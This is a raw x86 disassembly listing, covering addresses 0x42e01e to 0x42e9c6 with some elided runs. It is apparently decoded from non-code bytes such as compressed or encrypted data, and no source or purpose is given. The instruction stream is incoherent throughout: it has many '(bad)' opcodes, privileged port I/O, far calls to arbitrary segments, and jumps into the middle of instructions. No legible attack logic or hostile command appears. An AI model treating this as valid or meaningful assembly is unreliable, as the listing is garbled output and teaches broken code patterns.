  42e01e:	imul   eax,edx,0x2b
  42e021:	pop    edx
  42e022:	push   eax
  42e023:	out    0x41,eax
  42e025:	stos   DWORD PTR es:[edi],eax
  42e026:	inc    edx
  42e027:	in     eax,0xc5
  42e029:	rcr    cl,0x1e
  42e02c:	add    DWORD PTR [edx+0x12],0x7e
  42e030:	jnp    0x42e093
  42e032:	sub    esi,esi
  42e034:	mov    ds:0x74cd1eb0,al
  42e039:	out    dx,eax
  42e03a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e03b:	xor    eax,0xe9cab854
  42e040:	mov    bh,0x39
  42e042:	jb     0x42e094
  42e044:	jle    0x42e06d
  42e046:	jne    0x42e00e
  42e048:	loop   0x42e06d
  42e04a:	clc    
  42e04b:	call   0xbd1:0xf4a895d
  42e052:	pop    esi
  42e053:	xchg   edx,eax
  42e054:	mov    bh,0xba
  42e056:	stos   BYTE PTR es:[edi],al
  42e057:	in     al,dx
  42e058:	(bad)  
  42e059:	push   edx
  42e05a:	mov    al,0x5a
  42e05c:	ja     0x42e028
  42e05e:	jle    0x42e09b
  42e060:	or     edx,DWORD PTR [ecx+0x5075d940]
  42e066:	xchg   ebp,eax
  42e067:	dec    esp
  42e068:	retf   0x790e
  42e06b:	inc    ebx
  42e06c:	push   esp
  42e06d:	mov    ebp,DWORD PTR [esi]
  42e06f:	add    al,0x7e
  42e071:	lds    eax,FWORD PTR [ebx-0x19c13dc3]
  42e077:	mov    ds:0xdaadeee7,eax
  42e07c:	retf   0xab42
  42e07f:	xor    BYTE PTR [ecx-0x528d107f],bh
  42e085:	or     bh,BYTE PTR [esi-0x6d]
  42e088:	cmc    
  42e089:	adc    BYTE PTR ds:0x8ab6385f,ch
  42e08f:	outs   dx,DWORD PTR ds:[esi]
  42e090:	and    al,0x87
  42e092:	lods   al,BYTE PTR ds:[esi]
  42e093:	loope  0x42e08c
  42e095:	cmp    edx,DWORD PTR [esi-0x1cafeee7]
  42e09b:	jo     0x42e0e3
  42e09d:	aas    
  42e09e:	mov    eax,ds:0x305b84d4
  42e0a3:	cmp    BYTE PTR ds:0x699c8b93,cl
  42e0a9:	add    bl,BYTE PTR [ebx-0x49525387]
  42e0af:	cmp    DWORD PTR [esi],0x56346489
  42e0b5:	jl     0x42e0e2
  42e0b7:	mov    eax,0x8b710090
  42e0bc:	add    DWORD PTR [esi],ebx
  42e0be:	xchg   edx,eax
  42e0bf:	sti    
  42e0c0:	mov    ebp,0x527034a1
  42e0c5:	(bad)  
  42e0c6:	out    dx,al
  42e0c7:	fdivr  DWORD PTR [ecx-0x78015e36]
  42e0cd:	fnstsw WORD PTR [edx-0x4fdd546]
  42e0d3:	dec    ebx
  42e0d4:	mov    al,ds:0x1178186b
  42e0d9:	sti    
  42e0da:	cmp    al,0x9a
  42e0dc:	call   0x806:0x905a804d
  42e0e3:	or     DWORD PTR ds:0x2ada2cc4,0x5f
  42e0ea:	hlt    
  42e0eb:	hlt    
  42e0ec:	test   DWORD PTR [edx+0x3c],ebp
  42e0ef:	bound  edx,QWORD PTR ss:[edx]
  42e0f2:	push   ds
  42e0f3:	and    al,0x72
  42e0f5:	jno    0x42e0e6
  42e0f7:	sub    DWORD PTR [ecx+ecx*4],edi
  42e0fa:	ret    
  42e0fb:	fidivr DWORD PTR [ecx-0x3a]
  42e0fe:	clc    
  42e0ff:	pop    eax
  42e100:	sub    esp,ecx
  42e102:	call   0xed20:0x37dff1dd
  42e109:	dec    edi
  42e10a:	inc    esi
  42e10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e10c:	mov    es,esp
  42e10e:	add    BYTE PTR [esi-0x64],0x0
	...
  42e172:	add    BYTE PTR [eax],al
  42e174:	mov    eax,ds:0x7e061ecf
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	xor    edx,eax
  42e182:	(bad)  
  42e183:	ds dec edi
  42e185:	out    dx,al
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0x4000001
  42e18d:	jb     0x42e1b8
  42e18f:	or     DWORD PTR [edi-0x72],ebx
  42e192:	popa   
  42e193:	outs   dx,DWORD PTR ds:[esi]
  42e194:	jno    0x42e161
  42e196:	jecxz  0x42e1d4
  42e198:	cmc    
  42e199:	inc    edx
  42e19a:	std    
  42e19b:	aaa    
  42e19c:	out    dx,al
  42e19d:	imul   ebx,DWORD PTR [ecx+esi*2+0x5a],0xcd228381
  42e1a5:	dec    edx
  42e1a6:	dec    eax
  42e1a7:	in     al,dx
  42e1a8:	pop    ebx
  42e1a9:	dec    ecx
  42e1aa:	or     eax,0x4a5b1b4e
  42e1af:	jnp    0x42e17f
  42e1b1:	aad    0x29
  42e1b3:	inc    ebx
  42e1b4:	add    esi,esp
  42e1b6:	or     BYTE PTR [ebx+0x20],0xde
  42e1ba:	dec    edi
  42e1bb:	pop    ds
  42e1bc:	or     eax,ebx
  42e1be:	js     0x42e1e8
  42e1c0:	xchg   edx,eax
  42e1c1:	fcom   QWORD PTR [edx-0x69]
  42e1c4:	lods   al,BYTE PTR ds:[esi]
  42e1c5:	jnp    0x42e182
  42e1c7:	lock les eax,FWORD PTR [edi]
  42e1ca:	push   edi
  42e1cb:	dec    eax
  42e1cc:	pmaxub mm2,mm0
  42e1cf:	scas   eax,DWORD PTR es:[edi]
  42e1d0:	mov    al,ds:0x91820f1e
  42e1d5:	inc    edx
  42e1d6:	sub    eax,0xd9b69ae5
  42e1db:	pop    esp
  42e1dc:	pop    ebp
  42e1dd:	cmp    al,0xd0
  42e1df:	dec    ebx
  42e1e0:	jl     0x42e196
  42e1e2:	mov    edx,0xae38e7d2
  42e1e7:	mov    ds:0x88e8da0f,al
  42e1ec:	or     DWORD PTR [ecx],esi
  42e1ee:	push   ecx
  42e1ef:	nop
  42e1f0:	icebp  
  42e1f1:	je     0x42e190
  42e1f3:	xor    eax,0x50001be4
  42e1f8:	je     0x42e1b1
  42e1fa:	test   eax,0x430ced09
  42e1ff:	repz push edx
  42e201:	sub    al,ah
  42e203:	mov    DWORD PTR [edi-0x6],edi
  42e206:	push   edi
  42e207:	pop    edi
  42e208:	xchg   ebx,eax
  42e209:	popa   
  42e20a:	in     eax,dx
  42e20b:	bound  esp,QWORD PTR [ebp-0x5e4f6ad1]
  42e211:	das    
  42e212:	call   0x8be9e3a
  42e217:	inc    edi
  42e218:	jno    0x42e1f0
  42e21a:	add    dl,BYTE PTR [ecx-0x22d5d35c]
  42e220:	jle    0x42e28b
  42e222:	xchg   edi,eax
  42e223:	inc    edi
  42e224:	sub    BYTE PTR [eax+eiz*8-0x63],al
  42e228:	push   cs
  42e229:	mov    al,0xae
  42e22b:	add    bl,BYTE PTR [eax+0x9]
  42e22e:	push   ds
  42e22f:	xchg   ebx,eax
  42e230:	mov    eax,ds:0xbad79539
  42e235:	fistp  WORD PTR ds:0x516db3c
  42e23b:	add    ah,dl
  42e23d:	jl     0x42e23a
  42e23f:	jns    0x42e1d1
  42e241:	or     eax,0xeb0c6601
  42e246:	shr    BYTE PTR [edx],cl
  42e248:	mov    al,0xf6
  42e24a:	mov    eax,ds:0xc2f96564
  42e24f:	ficom  DWORD PTR [esi-0x32]
  42e252:	out    0x55,al
  42e254:	push   esi
  42e255:	fldcw  WORD PTR [esp+esi*8+0x3e33a74a]
  42e25c:	test   eax,0xd76d9f4c
  42e261:	or     bl,bh
  42e263:	inc    ecx
  42e264:	sub    ecx,DWORD PTR [edi]
  42e266:	fidivr WORD PTR [eax]
  42e268:	jo     0x42e1f8
  42e26a:	(bad)  
  42e26b:	adc    eax,0xa66f072c
  42e270:	and    eax,0x8dbfd4d4
  42e275:	(bad)  
  42e276:	out    0x72,eax
  42e278:	pop    eax
  42e279:	add    BYTE PTR [eax+0x4c],al
  42e27c:	dec    edi
  42e27d:	xchg   ebx,eax
  42e27e:	push   esi
  42e27f:	out    dx,al
  42e280:	cs in  eax,0xc5
  42e283:	pop    ecx
  42e284:	xchg   bl,bh
  42e286:	mov    dh,0x52
  42e288:	in     eax,0xb1
  42e28a:	retf   
  42e28b:	dec    ebx
  42e28c:	cdq    
  42e28d:	in     al,dx
  42e28e:	sub    BYTE PTR [eax+0xbb],bl
	...
  42e2f4:	lods   eax,DWORD PTR ds:[esi]
  42e2f5:	cmp    eax,0xb79aa78a
  42e2fa:	lods   eax,DWORD PTR ds:[esi]
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x9f199140
  42e301:	(bad)  
  42e303:	push   esi
  42e304:	push   esp
  42e305:	out    dx,eax
  42e306:	add    DWORD PTR [eax],eax
  42e308:	add    eax,0xf2000001
  42e30d:	retf   0xab4b
  42e310:	pop    ds
  42e311:	dec    edi
  42e312:	dec    edx
  42e313:	repz push edx
  42e315:	into   
  42e316:	aas    
  42e317:	xchg   dl,bh
  42e319:	retf   0x39a4
  42e31c:	push   esi
  42e31d:	mov    bl,0xa0
  42e31f:	std    
  42e320:	xchg   edi,eax
  42e321:	or     cl,bl
  42e323:	fwait
  42e324:	inc    ecx
  42e325:	ret    
  42e326:	mov    eax,ds:0x1acda5d3
  42e32b:	(bad)  
  42e32c:	push   esp
  42e32d:	push   ecx
  42e32e:	jecxz  0x42e37e
  42e330:	jmp    0xa1f3:0x628fc5c
  42e337:	lods   al,BYTE PTR ds:[esi]
  42e338:	adc    eax,0x5a61e860
  42e33d:	add    al,0x9c
  42e33f:	and    eax,0x797d19a
  42e344:	push   0xa3bc740a
  42e349:	jno    0x42e35b
  42e34b:	or     eax,DWORD PTR [ebx-0x3c579c7a]
  42e351:	xchg   edx,eax
  42e352:	push   0x45
  42e354:	pop    ebx
  42e355:	sbb    ecx,DWORD PTR [ebx*8+0x38a80a1a]
  42e35c:	(bad)  
  42e35d:	and    ebx,DWORD PTR [edi+0x4a]
  42e360:	cmc    
  42e361:	mov    cl,0x3a
  42e363:	test   al,0xd3
  42e365:	daa    
  42e366:	cwde   
  42e367:	clc    
  42e368:	sub    bl,bl
  42e36a:	test   BYTE PTR [eax+esi*1],al
  42e36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e36f:	push   edi
  42e370:	cmp    eax,0xa3bc01db
  42e375:	mov    ds:0xf5ce5998,eax
  42e37a:	sahf   
  42e37b:	dec    esp
  42e37c:	sahf   
  42e37d:	neg    eax
  42e37f:	sahf   
  42e380:	stos   DWORD PTR es:[edi],eax
  42e381:	out    dx,al
  42e382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e383:	and    ebx,eax
  42e385:	jns    0x42e38e
  42e387:	repnz repz loope 0x42e403
  42e38b:	inc    edi
  42e38c:	jno    0x42e3e6
  42e38e:	jae    0x42e321
  42e390:	jbe    0x42e3cd
  42e392:	mov    esp,0x8e04083b
  42e397:	cmp    BYTE PTR [ecx+0x7e],cl
  42e39a:	sub    al,0x37
  42e39c:	sbb    eax,0x59be485d
  42e3a1:	arpl   WORD PTR [ebx-0x6fef9657],di
  42e3a7:	jmp    0x1c3:0x5a3480e7
  42e3ae:	add    bh,0xd5
  42e3b1:	repnz sub edi,esp
  42e3b4:	cdq    
  42e3b5:	xchg   edx,eax
  42e3b6:	push   0xffffff92
  42e3b8:	or     edx,DWORD PTR [edx]
  42e3ba:	push   ebx
  42e3bb:	mov    edx,0x686db224
  42e3c0:	dec    ecx
  42e3c1:	mov    bl,0xc2
  42e3c3:	mov    ch,0x83
  42e3c5:	sar    DWORD PTR [eax+0xb8ed5d4],cl
  42e3cb:	xchg   edi,eax
  42e3cc:	iret   
  42e3cd:	hlt    
  42e3ce:	xor    DWORD PTR [ebp+0x8],ebp
  42e3d1:	xor    al,0x37
  42e3d3:	out    dx,al
  42e3d4:	xor    edx,DWORD PTR [edi]
  42e3d6:	bound  eax,QWORD PTR [ecx+0x68]
  42e3d9:	adc    BYTE PTR [edx+0x4c],bh
  42e3dc:	sbb    DWORD PTR [ecx+edi*4],eax
  42e3df:	fsub   DWORD PTR [ecx+0x5]
  42e3e2:	sbb    al,0x65
  42e3e4:	xor    dl,BYTE PTR [ebx+eax*1-0x5f5209d5]
  42e3eb:	pop    DWORD PTR [eax+0x76cf575e]
  42e3f1:	push   ds
  42e3f2:	xchg   edx,eax
  42e3f3:	pop    ebp
  42e3f4:	icebp  
  42e3f5:	inc    edi
  42e3f6:	ret    
  42e3f7:	dec    ecx
  42e3f8:	sub    DWORD PTR [esi+0x612162f5],esp
  42e3fe:	mov    dh,dl
  42e400:	loope  0x42e387
  42e402:	xchg   edx,eax
  42e403:	dec    edx
  42e404:	sub    BYTE PTR [esi-0x4b],cl
  42e407:	mov    gs,ecx
  42e409:	cmp    DWORD PTR [ecx],ebp
  42e40b:	push   0xffffff83
  42e40d:	push   eax
  42e40e:	and    eax,0x69fd
	...
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	mov    eax,0x59d948b6
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0x1000001
  42e48d:	call   0x97588fab
  42e492:	jecxz  0x42e47d
  42e494:	xchg   DWORD PTR [edx-0xc],esp
  42e497:	test   BYTE PTR [ebx-0x2d],cl
  42e49a:	enter  0xd02f,0x9e
  42e49e:	xchg   edx,eax
  42e49f:	add    eax,0xf9ae7954
  42e4a4:	mov    ebp,0x8241e5a0
  42e4a9:	mov    cl,0x68
  42e4ab:	inc    edi
  42e4ac:	es cmp al,0x54
  42e4af:	push   esi
  42e4b0:	inc    esp
  42e4b1:	jmp    0x42e468
  42e4b3:	adc    bl,BYTE PTR [ecx]
  42e4b5:	and    DWORD PTR [edi],0x55
  42e4b8:	fiadd  DWORD PTR [esi+0x1d]
  42e4bb:	(bad)  
  42e4bc:	mov    ebx,0xd231a2a9
  42e4c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e4c2:	or     DWORD PTR [ebx+0x1527d207],edi
  42e4c8:	cmp    esi,edx
  42e4ca:	sbb    BYTE PTR [ebp-0x2c],0xfe
  42e4ce:	adc    ebx,DWORD PTR [eax]
  42e4d0:	jmp    0xe007a889
  42e4d5:	ins    BYTE PTR es:[edi],dx
  42e4d6:	mov    dh,0x49
  42e4d8:	sbb    al,0xbb
  42e4da:	sbb    cl,dh
  42e4dc:	jnp    0x42e546
  42e4de:	mov    edi,0xfb012c16
  42e4e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4e4:	sub    BYTE PTR [edx-0xf20fa3c],al
  42e4ea:	(bad)  
  42e4eb:	int    0x9
  42e4ed:	pop    ebp
  42e4ee:	call   0xbcfd:0x7ac2e9be
  42e4f5:	out    0x29,al
  42e4f7:	outs   dx,DWORD PTR ds:[esi]
  42e4f8:	mov    eax,0x1acf4725
  42e4fd:	push   ds
  42e4fe:	ficom  WORD PTR [ebx+ebp*8+0x7ad9704]
  42e505:	add    eax,0xfbaa43da
  42e50a:	sar    BYTE PTR [esi-0x113b13ce],1
  42e510:	mov    ebp,0x2259bb82
  42e515:	ret    
  42e516:	arpl   WORD PTR [ebx],cx
  42e518:	les    ebx,FWORD PTR [ecx]
  42e51a:	pop    ds
  42e51b:	pop    ss
  42e51c:	enter  0xb3cc,0xec
  42e520:	sbb    eax,0xbc06e16c
  42e525:	sbb    ecx,DWORD PTR [esi+0x4e]
  42e528:	arpl   WORD PTR [ecx],dx
  42e52a:	jb     0x42e502
  42e52c:	outs   dx,DWORD PTR ds:[esi]
  42e52d:	and    esi,DWORD PTR [ebp+ebx*1-0x1c]
  42e531:	xchg   ebx,eax
  42e532:	sbb    BYTE PTR [ebx+0x1324b302],0x28
  42e539:	sbb    DWORD PTR [edx+ebx*2-0xa7c627a],edi
  42e540:	push   es
  42e541:	mov    dh,0xa3
  42e543:	arpl   di,di
  42e545:	fwait
  42e546:	mov    al,ds:0xb2e27bf8
  42e54b:	pusha  
  42e54c:	and    al,0xb6
  42e54e:	test   eax,0xf5087c9e
  42e553:	mov    al,0x84
  42e555:	mov    eax,0xef3db12e
  42e55a:	sbb    al,0x55
  42e55c:	imul   edx,DWORD PTR [edx],0xffffff9a
  42e55f:	push   ebp
  42e560:	pop    ecx
  42e561:	push   ebx
  42e562:	sbb    al,0x19
  42e564:	in     al,0xdc
  42e566:	mov    ebp,DWORD PTR [ebp+eax*8+0x45]
  42e56a:	neg    cl
  42e56c:	jmp    0x73e5b954
  42e571:	fcom   DWORD PTR [edi]
  42e573:	mov    ds:0xcda78d68,eax
  42e578:	push   edx
  42e579:	pusha  
  42e57a:	sar    edi,1
  42e57c:	add    esi,DWORD PTR [ecx+0x21]
  42e57f:	push   es
  42e580:	call   0x902f:0x576c7ec3
  42e587:	retf   0xb94d
  42e58a:	xchg   ebp,eax
  42e58b:	sbb    BYTE PTR [esi+ebx*1],dh
  42e58e:	cmp    bl,dh
  42e590:	in     al,dx
	...
  42e5f1:	add    BYTE PTR [eax],al
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	jbe    0x42e64d
  42e602:	fstp   DWORD PTR [edx+0x1f15e]
  42e608:	add    eax,0xea000001
  42e60d:	outs   dx,BYTE PTR ds:[esi]
  42e60e:	fbstp  TBYTE PTR [eax+0x2c]
  42e611:	mov    bl,BYTE PTR [ebx-0x36]
  42e614:	addr16 nop
  42e616:	stos   DWORD PTR es:[edi],eax
  42e617:	pop    ss
  42e618:	fst    QWORD PTR [ecx+0xc6f8983]
  42e61e:	push   0x13360d83
  42e623:	dec    ebp
  42e624:	mov    edi,0x3808188d
  42e629:	cs stos BYTE PTR es:[edi],al
  42e62b:	pop    eax
  42e62c:	sub    BYTE PTR [edx+0x4e],cl
  42e62f:	sub    DWORD PTR [eax],esp
  42e631:	bound  ebp,QWORD PTR [esi]
  42e633:	in     eax,dx
  42e634:	in     al,dx
  42e635:	int    0xa
  42e637:	add    DWORD PTR ds:0x595cb628,eax
  42e63d:	stos   DWORD PTR es:[edi],eax
  42e63e:	outs   dx,DWORD PTR ds:[esi]
  42e63f:	into   
  42e640:	jnp    0x42e60c
  42e642:	gs adc eax,0xf9ca46ae
  42e648:	xor    eax,0x24fec428
  42e64d:	(bad)  
  42e64e:	ficomp DWORD PTR [ecx-0x2b2f9ecf]
  42e654:	push   esp
  42e655:	or     al,0x8c
  42e657:	bound  edi,QWORD PTR [eax+0x55]
  42e65a:	je     0x42e656
  42e65c:	xchg   edi,eax
  42e65d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e65e:	aas    
  42e65f:	dec    ebp
  42e660:	ret    
  42e661:	and    BYTE PTR [edi+0x36],al
  42e664:	ss mov ebx,0x18a4c982
  42e66a:	mov    ch,0xb5
  42e66c:	inc    ebx
  42e66d:	or     al,0xb0
  42e66f:	test   al,0x9b
  42e671:	jbe    0x42e6d2
  42e673:	mov    ecx,0x213d79bb
  42e678:	lods   al,BYTE PTR ds:[esi]
  42e679:	cmp    BYTE PTR [edx+0x5cb872c6],bh
  42e67f:	cmp    DWORD PTR [eax+0x516da88f],edi
  42e685:	sahf   
  42e686:	push   esp
  42e687:	fdiv   QWORD PTR [ebp-0x7a51f66d]
  42e68d:	daa    
  42e68e:	jg     0x42e6a8
  42e690:	icebp  
  42e691:	mov    eax,ds:0xf0ea15e6
  42e696:	scas   eax,DWORD PTR es:[edi]
  42e697:	loop   0x42e656
  42e699:	sti    
  42e69a:	push   ebp
  42e69b:	push   ebx
  42e69c:	add    eax,0xea4efc53
  42e6a1:	fcmovnu st,st(6)
  42e6a3:	xlat   BYTE PTR ds:[ebx]
  42e6a4:	xchg   ecx,eax
  42e6a5:	inc    edi
  42e6a6:	(bad)  
  42e6a7:	ins    DWORD PTR es:[edi],dx
  42e6a8:	stos   BYTE PTR es:[edi],al
  42e6a9:	ins    DWORD PTR es:[edi],dx
  42e6aa:	adc    al,0x6a
  42e6ac:	jg     0x42e630
  42e6ae:	sbb    eax,edi
  42e6b0:	push   ds
  42e6b1:	mov    ah,0xa6
  42e6b3:	icebp  
  42e6b4:	pop    eax
  42e6b5:	sahf   
  42e6b6:	push   ss
  42e6b7:	out    dx,eax
  42e6b8:	lods   al,BYTE PTR ds:[esi]
  42e6b9:	popa   
  42e6ba:	(bad)  
  42e6bb:	sbb    al,0xe7
  42e6bd:	pop    es
  42e6be:	or     al,0x50
  42e6c0:	pop    ecx
  42e6c1:	dec    edi
  42e6c2:	xchg   ecx,eax
  42e6c3:	jbe    0x42e6cb
  42e6c5:	push   ebp
  42e6c6:	pop    edx
  42e6c7:	(bad)  
  42e6c8:	mov    ah,BYTE PTR [eax+edx*1+0x50d7e46a]
  42e6cf:	js     0x42e70b
  42e6d1:	sub    eax,DWORD PTR [esi+0x7fcc5a7]
  42e6d7:	sub    eax,0x389a9637
  42e6dc:	popf   
  42e6dd:	or     eax,DWORD PTR [ebx-0x73]
  42e6e0:	sub    bl,BYTE PTR [eax+0x6f6bc82f]
  42e6e6:	nop
  42e6e7:	pop    edx
  42e6e8:	pop    ecx
  42e6e9:	ficom  DWORD PTR [edi-0x7a]
  42e6ec:	push   0x49ff54d6
  42e6f1:	call   0x146555cb
  42e6f6:	jp     0x42e6b1
  42e6f8:	std    
  42e6f9:	mov    dh,BYTE PTR gs:0xdafee491
  42e700:	sub    edi,esi
  42e702:	xchg   ecx,eax
  42e703:	add    eax,0xa528ef81
  42e708:	test   al,0x6e
  42e70a:	scas   al,BYTE PTR es:[edi]
  42e70b:	imul   BYTE PTR [eax]
  42e70d:	jmp    0x42e76f
  42e70f:	pop    ebx
  42e710:	lds    eax,FWORD PTR [eax]
	...
  42e772:	add    BYTE PTR [eax],al
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	(bad)  
  42e781:	stc    
  42e782:	and    esi,ebp
  42e784:	arpl   dx,si
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    eax,0x9b000001
  42e78d:	rcl    BYTE PTR [edi],1
  42e78f:	push   ebp
  42e790:	jmp    0xdd3a:0x2af41ad3
  42e797:	imul   esp,ebx,0xffffffb8
  42e79a:	aas    
  42e79b:	sbb    eax,0x65db67e9
  42e7a0:	ins    DWORD PTR es:[edi],dx
  42e7a1:	sbb    eax,0xe92296dc
  42e7a6:	jne    0x42e7e0
  42e7a8:	mov    BYTE PTR [eax-0x28],cl
  42e7ab:	arpl   WORD PTR [eax+0x18a09f6e],bp
  42e7b1:	and    al,0x73
  42e7b3:	fwait
  42e7b4:	sti    
  42e7b5:	push   ebx
  42e7b6:	leave  
  42e7b7:	ret    
  42e7b8:	fwait
  42e7b9:	pop    es
  42e7ba:	cdq    
  42e7bb:	or     ebp,ebx
  42e7bd:	sub    ch,0xd5
  42e7c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e7c1:	test   DWORD PTR [edi+0x6a],0x40e63a6d
  42e7c8:	das    
  42e7c9:	int3   
  42e7ca:	jne    0x42e80c
  42e7cc:	enter  0x898d,0x69
  42e7d0:	jg     0x42e842
  42e7d2:	ins    DWORD PTR es:[edi],dx
  42e7d3:	mov    dl,0x10
  42e7d5:	sub    edi,DWORD PTR [esi+0x6d]
  42e7d8:	pushf  
  42e7d9:	iret   
  42e7da:	cmp    esi,ebx
  42e7dc:	dec    esi
  42e7dd:	jno    0x42e833
  42e7df:	(bad)  
  42e7e0:	(bad)  
  42e7e1:	jp     0x42e770
  42e7e3:	in     al,dx
  42e7e4:	shl    BYTE PTR [edx-0x32],0x12
  42e7e8:	mov    ebp,0x5b5a6388
  42e7ed:	into   
  42e7ee:	shr    DWORD PTR [eax],1
  42e7f0:	(bad)  
  42e7f1:	shl    DWORD PTR [edx+edi*8+0x730e0af0],cl
  42e7f8:	add    eax,0x5d0ba6f7
  42e7fd:	mov    ds:0xb34421ec,eax
  42e802:	call   0x60012d02
  42e807:	pop    ss
  42e808:	sbb    al,0x74
  42e80a:	mov    ebp,0xb2a74995
  42e80f:	pop    ecx
  42e810:	in     eax,0x3c
  42e812:	jns    0x42e81e
  42e814:	outs   dx,DWORD PTR ds:[esi]
  42e815:	mov    esi,0xb447fa7a
  42e81a:	or     dl,cl
  42e81c:	(bad)  
  42e81d:	ror    BYTE PTR [eax+0x39bbad51],1
  42e823:	out    0xb,eax
  42e825:	xlat   BYTE PTR ds:[ebx]
  42e826:	je     0x42e827
  42e828:	inc    ecx
  42e829:	rcr    DWORD PTR [ebx+eax*4-0x19],cl
  42e82d:	sub    DWORD PTR [ebx],0x31dff518
  42e833:	stos   DWORD PTR es:[edi],eax
  42e834:	sti    
  42e835:	push   esi
  42e836:	and    eax,0x76b8832b
  42e83b:	lods   al,BYTE PTR ds:[esi]
  42e83c:	popf   
  42e83d:	sar    BYTE PTR [esi+0x329b223e],1
  42e843:	cli    
  42e844:	int    0xc0
  42e846:	jne    0x42e7db
  42e848:	add    eax,ebx
  42e84a:	mov    al,ds:0xa72517a4
  42e84f:	sub    al,0xc3
  42e851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e852:	aaa    
  42e853:	in     eax,dx
  42e854:	sbb    dh,BYTE PTR [ebx-0xe]
  42e857:	cs adc al,0x37
  42e85a:	xor    ch,BYTE PTR [edi]
  42e85c:	adc    eax,0x81d18a15
  42e861:	adc    DWORD PTR [ebp+0xa],0xba0681a0
  42e868:	mov    esi,0xa865f82f
  42e86d:	sar    DWORD PTR [eax-0x7a],0xd6
  42e871:	stc    
  42e872:	lea    ebp,[ecx+eiz*1-0x39]
  42e876:	lahf   
  42e877:	out    0x38,al
  42e879:	jb     0x42e8c8
  42e87b:	icebp  
  42e87c:	and    DWORD PTR [eax-0x5e4eb141],eax
  42e882:	push   esp
  42e883:	clc    
  42e884:	fcomp  DWORD PTR [edx]
  42e886:	pop    edx
  42e887:	pop    ss
  42e888:	push   cs
  42e889:	fwait
  42e88a:	jecxz  0x42e86d
  42e88c:	and    bl,BYTE PTR ds:0x11cc4d
	...
  42e8f2:	add    BYTE PTR [eax],al
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0x5823f82b]
  42e901:	or     DWORD PTR [ebx+edi*4+0x1f368],esi
  42e908:	add    eax,0x98000001
  42e90d:	xlat   BYTE PTR ds:[ebx]
  42e90e:	cli    
  42e90f:	dec    ebx
  42e910:	pop    esi
  42e911:	xchg   ebx,eax
  42e912:	cdq    
  42e913:	dec    esp
  42e914:	lea    ecx,[edx+0x44b88655]
  42e91a:	sub    BYTE PTR [esi],0xef
  42e91d:	test   eax,0x77883116
  42e922:	cmp    BYTE PTR [ebp-0x41],dh
  42e925:	add    al,0x50
  42e927:	stos   BYTE PTR es:[edi],al
  42e928:	or     cl,bh
  42e92a:	imul   esi,DWORD PTR [eax],0x14dbfe0a
  42e930:	push   edi
  42e931:	lea    ebp,[eax]
  42e933:	lock push 0xffffffbd
  42e936:	mov    al,0x47
  42e938:	cs cld 
  42e93a:	inc    ecx
  42e93b:	xor    BYTE PTR [edi],0xd
  42e93e:	jl     0x42e975
  42e940:	mov    ds:0x4368ac41,al
  42e945:	mov    dl,0xf3
  42e947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e948:	and    DWORD PTR [eax-0x57],ebx
  42e94b:	fucomi st,st(4)
  42e94d:	es add eax,0x52601bfa
  42e953:	push   0x43570bc4
  42e958:	pop    esi
  42e959:	arpl   WORD PTR [esi+0x3de51ef9],cx
  42e95f:	ja     0x42e8ea
  42e961:	jmp    0x42e900
  42e963:	push   eax
  42e964:	fs pop ss
  42e966:	lea    eax,[esi-0x3c03a458]
  42e96c:	pop    edi
  42e96d:	xor    DWORD PTR [ebx+edi*4-0x5b4bb87],eax
  42e974:	and    cl,BYTE PTR [ebx+0x2ef241f7]
  42e97a:	(bad)  
  42e97b:	pushf  
  42e97c:	(bad)  
  42e97d:	pop    ds
  42e97e:	dec    esi
  42e97f:	outs   dx,BYTE PTR ds:[esi]
  42e980:	call   0x6a3b:0x3e61dd9e
  42e987:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e988:	jecxz  0x42e93b
  42e98a:	fstp   QWORD PTR [edi+ecx*1]
  42e98d:	xchg   edi,eax
  42e98e:	out    dx,eax
  42e98f:	mov    cl,0xd1
  42e991:	inc    ecx
  42e992:	out    dx,eax
  42e993:	leave  
  42e994:	cli    
  42e995:	jb     0x42ea14
  42e997:	int    0x70
  42e999:	(bad)  
  42e99a:	push   edi
  42e99b:	test   al,0x80
  42e99d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e99e:	scas   eax,DWORD PTR es:[edi]
  42e99f:	retf   0x2b0b
  42e9a2:	repnz sbb esi,ecx
  42e9a5:	(bad)  
  42e9a7:	call   0xa36c7b6b
  42e9ac:	adc    al,0xf
  42e9ae:	out    0x19,eax
  42e9b0:	inc    esp
  42e9b1:	test   al,0x22
  42e9b3:	adc    eax,0x4a7353a9
  42e9b8:	push   edi
  42e9b9:	ja     0x42e9bb
  42e9bb:	mov    dl,0xc1
  42e9bd:	pop    ecx
  42e9be:	aaa    
  42e9bf:	cmp    eax,0x41974711
  42e9c4:	(bad)  
  42e9c5:	lods   al,BYTE PTR ds:[esi]
  42e9c6:	(bad)  
